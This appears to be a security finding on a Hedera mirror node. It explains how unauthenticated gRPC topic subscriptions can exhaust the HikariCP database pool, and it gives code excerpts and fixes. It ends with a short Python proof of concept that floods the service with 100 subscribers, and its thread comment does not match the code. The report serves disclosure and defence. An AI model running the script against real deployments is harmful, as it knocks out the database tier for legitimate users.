### Title
Unbounded Concurrent Subscriber DB Connection Pool Exhaustion via `PollingTopicListener.poll()`

### Summary
`PollingTopicListener.poll()` creates a fully independent database query for every subscriber with no global subscriber cap or authentication requirement. An unprivileged attacker opening many gRPC connections and subscribing to a high-volume topic can saturate the HikariCP connection pool, causing connection-acquisition timeouts for all legitimate users and internal services sharing the same pool.

### Finding Description

**Exact code path:**

`PollingTopicListener.poll()` (lines 51–62) issues a fresh `topicMessageRepository.findByFilter(newFilter)` call on every poll tick for every subscriber independently:

```java
// PollingTopicListener.java lines 54-61
int limit = filter.hasLimit()
        ? (int) (filter.getLimit() - context.getCount().get())
        : Integer.MAX_VALUE;                          // no limit → Integer.MAX_VALUE
int pageSize = Math.min(limit, listenerProperties.getMaxPageSize()); // capped at 5000
...
return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
```

`TopicMessageRepositoryCustomImpl.findByFilter()` (lines 48–60) executes a blocking JDBC call via `typedQuery.getResultList()`, holding a HikariCP connection for the full query duration (up to `statementTimeout` = 10 s by default):

```java
// TopicMessageRepositoryCustomImpl.java lines 48-60
TypedQuery<TopicMessage> typedQuery = entityManager.createQuery(query);
...
return typedQuery.getResultList().stream(); // blocking; holds connection until complete
```

`listen()` repeats this every `interval` (default 500 ms) for `Long.MAX_VALUE` iterations per subscriber (lines 38–43).

**Root cause and failed assumptions:**

1. `TopicMessageServiceImpl.subscriberCount` (line 48) is a **metrics gauge only** — it is never checked against a maximum before accepting a new subscription.
2. `NettyProperties.maxConcurrentCallsPerConnection = 5` limits calls **per TCP connection**, not globally. An attacker opens many connections.
3. No authentication is required on the gRPC port (5600).
4. No per-IP or global rate limit exists on `subscribeTopic`.

### Impact Explanation

HikariCP's default pool size is 10 connections. With N concurrent subscribers all polling simultaneously every 500 ms, and each query holding a connection for the duration of `getResultList()` (potentially seconds on a high-volume topic returning 5000 rows), the pool is exhausted when N exceeds the pool size. All subsequent connection-acquisition attempts block until HikariCP's `connectionTimeout` (default 30 s) expires, returning `SQLTransientConnectionException` to every caller — including the importer's write path and other gRPC subscribers. This constitutes a full denial-of-service for the mirror node's database tier.

### Likelihood Explanation

The gRPC port is publicly accessible with no authentication. A single attacker machine can open dozens of TCP connections (each carrying 5 streams = 5 subscribers), reaching pool exhaustion with ~2 connections. The attack is trivially repeatable, requires no special knowledge beyond the public gRPC API, and is persistent as long as the attacker keeps connections open.

### Recommendation

1. **Enforce a global subscriber cap**: Check `subscriberCount` against a configurable maximum in `TopicMessageServiceImpl.subscribeTopic()` and reject with `RESOURCE_EXHAUSTED` when exceeded.
2. **Add per-IP connection rate limiting** at the Netty/gRPC interceptor layer.
3. **Isolate the gRPC listener DB pool** from the importer write pool with a separate, bounded `DataSource` and a low `maximumPoolSize` (e.g., 5), so exhaustion cannot cascade to writes.
4. **Require authentication** (mTLS or token) on the gRPC endpoint for production deployments.

### Proof of Concept

```python
import grpc, threading
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, consensus_service_pb2
from proto.mirror import consensus_topic_query_pb2

def subscribe():
    channel = grpc.insecure_channel("mirror-node:5600")
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    req = consensus_topic_query_pb2.ConsensusTopicQuery(
        topicID=...,          # high-volume topic
        consensusStartTime=0, # no limit set → Integer.MAX_VALUE page size
    )
    for _ in stub.subscribeTopic(req):
        pass  # keep connection alive

# Open 20 threads × 5 streams/connection = 100 concurrent subscribers
threads = [threading.Thread(target=subscribe) for _ in range(100)]
for t in threads: t.start()
# Result: HikariCP pool (10 connections) exhausted within first poll cycle;
# all subsequent DB operations time out after 30s connectionTimeout.
```

**Reproducible steps:**
1. Deploy mirror node with `listener.type=POLL` and a high-volume topic (>5000 messages).
2. Run the script above from any unprivileged host.
3. Observe `HikariPool-1 - Connection is not available, request timed out after 30000ms` in mirror node logs within seconds.

```java
    private Flux<TopicMessage> poll(PollingContext context) {
        TopicMessageFilter filter = context.getFilter();
        TopicMessage last = context.getLast();
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getCount().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
        long startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();

        return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
    }
```
